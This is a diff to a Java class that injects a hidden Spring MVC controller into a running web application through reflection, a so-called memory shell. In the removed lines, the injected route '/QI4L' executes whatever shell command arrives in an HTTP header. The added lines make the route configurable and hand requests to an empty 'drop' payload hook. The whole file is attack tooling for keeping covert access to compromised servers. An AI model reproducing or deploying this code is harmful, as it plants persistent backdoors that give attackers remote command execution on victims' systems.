@@ -6,21 +6,20 @@ import java.lang.reflect.Method;
 import java.util.Map;
 
 public class SpringControllerMS {
+
     public static ClassLoader suLoader;
+
+    public static String pattern;
 
     static {
         try {
-            final String controllerPath = "/QI4L";
             getClassLoader();
-            Class<?> utilClass          = sayMyName("org.springframework.web.servlet.support.RequestContextUtils");
-            Class<?> holder             = sayMyName("org.springframework.web.context.request.RequestContextHolder");
-            Class<?> servletRequestAttr = sayMyName("org.springframework.web.context.request.ServletRequestAttributes");
-            Class<?> reqMappingHandler  = sayMyName("org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping");
-            Class<?> beanFactory        = sayMyName("org.springframework.beans.factory.BeanFactory");
+            Class<?> utilClass         = s("org.springframework.web.servlet.support.RequestContextUtils");
+            Class<?> holder            = s("org.springframework.web.context.request.RequestContextHolder");
+            Class<?> reqMappingHandler = s("org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping");
 
-
-            Class<?> servletRequest     = sayMyName("javax.servlet.ServletRequest");
-            Class<?> httpServletRequest = sayMyName("javax.servlet.http.HttpServletRequest");
+            Class<?> servletRequest     = s("javax.servlet.ServletRequest");
+            Class<?> httpServletRequest = s("javax.servlet.http.HttpServletRequest");
 
             // 获取当前应用上下文
             Method getWebApplicationContext;
@@ -36,17 +35,13 @@ public class SpringControllerMS {
             getAttributes.setAccessible(true);
             Object servletRequestAttributes = getAttributes.invoke(null);
 
-            // 获取 Request
-            Method getRequest = getMethodByClass(servletRequestAttr, "getRequest", new Class[]{});
-            getRequest.setAccessible(true);
-            Object requestObj = getRequest.invoke(servletRequestAttributes);
-            // 获取 WebApplicationContext
-            Object context = getWebApplicationContext.invoke(null, requestObj);
-
             // 通过 context 获取 RequestMappingHandlerMapping 对象
-            Method getBean = getMethodByClass(beanFactory, "getBean", new Class[]{Class.class});
-            getBean.setAccessible(true);
-            Object mapping = getBean.invoke(context, reqMappingHandler);
+            Object mapping = getMethodAndInvoke(
+                    getWebApplicationContext.invoke(null,
+                            getMethodAndInvoke(servletRequestAttributes, "getRequest", new Class[]{}, new Object[]{})
+                    ),
+                    "getBean", new Class[]{Class.class}, new Object[]{reqMappingHandler}
+            );
 
             // 获取父类的 MappingRegistry 属性
             Field f = mapping.getClass().getSuperclass().getSuperclass().getDeclaredField("mappingRegistry");
@@ -54,7 +49,7 @@ public class SpringControllerMS {
             Object mappingRegistry = f.get(mapping);
 
             // 反射调用 MappingRegistry 的 register 方法
-            Class<?> c  = sayMyName("org.springframework.web.servlet.handler.AbstractHandlerMethodMapping$MappingRegistry");
+            Class<?> c  = s("org.springframework.web.servlet.handler.AbstractHandlerMethodMapping$MappingRegistry");
             Method[] ms = c.getDeclaredMethods();
 
             // 判断当前路径是否已经添加
@@ -70,7 +65,7 @@ public class SpringControllerMS {
 
             Map<String, Object> urlLookup = (Map<String, Object>) lookupField.get(mappingRegistry);
             for (String urlPath : urlLookup.keySet()) {
-                if (controllerPath.equals(urlPath)) {
+                if (pattern.equals(urlPath)) {
                     flag = false;
                     break;
                 }
@@ -78,7 +73,6 @@ public class SpringControllerMS {
 
             if (flag) {
                 // 初始化一些注册需要的信息
-
                 Boolean isSpringHigh = false;
                 Object  url;
                 Object  pPRC         = null;
@@ -86,32 +80,30 @@ public class SpringControllerMS {
 
                 // 高版本 Spring 期望使用 PathPatternsRequestCondition
                 try {
-                    requestConditionClass = sayMyName("org.springframework.web.servlet.mvc.condition.PathPatternsRequestCondition");
+                    requestConditionClass = s("org.springframework.web.servlet.mvc.condition.PathPatternsRequestCondition");
 
-                    Class       pathPatternParserClass = sayMyName("org.springframework.web.util.pattern.PathPatternParser");
+                    Class       pathPatternParserClass = s("org.springframework.web.util.pattern.PathPatternParser");
                     Constructor constructor            = requestConditionClass.getDeclaredConstructor(pathPatternParserClass, String[].class);
                     constructor.setAccessible(true);
-                    pPRC = constructor.newInstance(pathPatternParserClass.newInstance(), new String[]{controllerPath});
+                    pPRC = constructor.newInstance(pathPatternParserClass.newInstance(), new String[]{pattern});
                     isSpringHigh = true;
                 } catch (Exception ignored) {
                 }
 
                 // 低版本使用 PatternsRequestCondition
-                requestConditionClass = sayMyName("org.springframework.web.servlet.mvc.condition.PatternsRequestCondition");
+                requestConditionClass = s("org.springframework.web.servlet.mvc.condition.PatternsRequestCondition");
                 Constructor constructor = requestConditionClass.getDeclaredConstructor(String[].class);
                 constructor.setAccessible(true);
-                url = constructor.newInstance(new Object[]{new String[]{controllerPath}});
+                url = constructor.newInstance(new Object[]{new String[]{pattern}});
 
+                Class<?> requestMethodsRequestCondition = s("org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition");
+                Class<?> requestMappingInfo             = s("org.springframework.web.servlet.mvc.method.RequestMappingInfo");
 
-                Class<?> requestMethodsRequestCondition = sayMyName("org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition");
-                Class<?> requestMappingInfo             = sayMyName("org.springframework.web.servlet.mvc.method.RequestMappingInfo");
-
-                Class<?> params           = sayMyName("org.springframework.web.servlet.mvc.condition.ParamsRequestCondition");
-                Class<?> headers          = sayMyName("org.springframework.web.servlet.mvc.condition.HeadersRequestCondition");
-                Class<?> consumes         = sayMyName("org.springframework.web.servlet.mvc.condition.ConsumesRequestCondition");
-                Class<?> produces         = sayMyName("org.springframework.web.servlet.mvc.condition.ProducesRequestCondition");
-                Class<?> requestCondition = sayMyName("org.springframework.web.servlet.mvc.condition.RequestCondition");
-
+                Class<?> params           = s("org.springframework.web.servlet.mvc.condition.ParamsRequestCondition");
+                Class<?> headers          = s("org.springframework.web.servlet.mvc.condition.HeadersRequestCondition");
+                Class<?> consumes         = s("org.springframework.web.servlet.mvc.condition.ConsumesRequestCondition");
+                Class<?> produces         = s("org.springframework.web.servlet.mvc.condition.ProducesRequestCondition");
+                Class<?> requestCondition = s("org.springframework.web.servlet.mvc.condition.RequestCondition");
 
                 // 实例化 RequestMethodsRequestCondition
                 Constructor constructor1 = requestMethodsRequestCondition.getDeclaredConstructor(java.util.Set.class);
@@ -123,7 +115,6 @@ public class SpringControllerMS {
                 constructor2.setAccessible(true);
                 Object info = constructor2.newInstance(url, condition, null, null, null, null, null);
 
-                //
                 if (isSpringHigh) {
                     Field field = requestMappingInfo.getDeclaredField("pathPatternsCondition");
                     field.setAccessible(true);
@@ -134,16 +125,16 @@ public class SpringControllerMS {
                     if ("register".equals(method.getName())) {
                         // 反射调用 MappingRegistry 的 register 方法注册 SpringControllerMS 的 index
                         method.setAccessible(true);
-                        method.invoke(mappingRegistry, info, SpringControllerMS.class.newInstance(), SpringControllerMS.class.getDeclaredMethod("readObjectToData", new Class[]{}));
+                        method.invoke(mappingRegistry, info, SpringControllerMS.class.newInstance(),
+                                SpringControllerMS.class.getDeclaredMethod("readObjectToData", new Class[]{}));
                     }
                 }
             }
         } catch (Exception ignored) {
         }
-
     }
 
-    public static Class sayMyName(String name) throws Exception {
+    public static Class s(String name) throws Exception {
         return Class.forName(name, true, suLoader);
     }
 
@@ -165,17 +156,27 @@ public class SpringControllerMS {
         return method;
     }
 
+    public static Object getMethodAndInvoke(Object obj, String methodName, Class[] parameterClass, Object[] parameters) {
+        try {
+            java.lang.reflect.Method method = getMethodByClass(obj.getClass(), methodName, parameterClass);
+            if (method != null)
+                return method.invoke(obj, parameters);
+        } catch (Exception ignored) {
+        }
+        return null;
+    }
+
     public void readObjectToData() throws Exception {
-        Class<?> holder             = sayMyName("org.springframework.web.context.request.RequestContextHolder");
-        Class<?> httpServletRequest = sayMyName("javax.servlet.http.HttpServletRequest");
-        Class<?> servletRequestAttr = sayMyName("org.springframework.web.context.request.ServletRequestAttributes");
-        Method   getAttributes      = getMethodByClass(holder, "currentRequestAttributes", new Class[]{});
+        Class<?> holder        = s("org.springframework.web.context.request.RequestContextHolder");
+        Method   getAttributes = getMethodByClass(holder, "currentRequestAttributes", new Class[]{});
         getAttributes.setAccessible(true);
         Object servletRequestAttributes = getAttributes.invoke(null);
-        Method getRequest               = getMethodByClass(servletRequestAttr, "getRequest", new Class[]{});
-        getRequest.setAccessible(true);
-        Object requestObj = getRequest.invoke(servletRequestAttributes);
-        Method method     = getMethodByClass(httpServletRequest, "getHeader", new Class[]{String.class});
-        java.lang.Runtime.getRuntime().exec(method.invoke(requestObj, "QI4L").toString());
+        Object request                  = getMethodAndInvoke(servletRequestAttributes, "getRequest", new Class[]{}, new Object[]{});
+        Object response                 = getMethodAndInvoke(servletRequestAttributes, "getResponse", new Class[]{}, new Object[]{});
+        drop(request, response);
+    }
+
+    public void drop(Object request, Object response) {
+
     }
 }
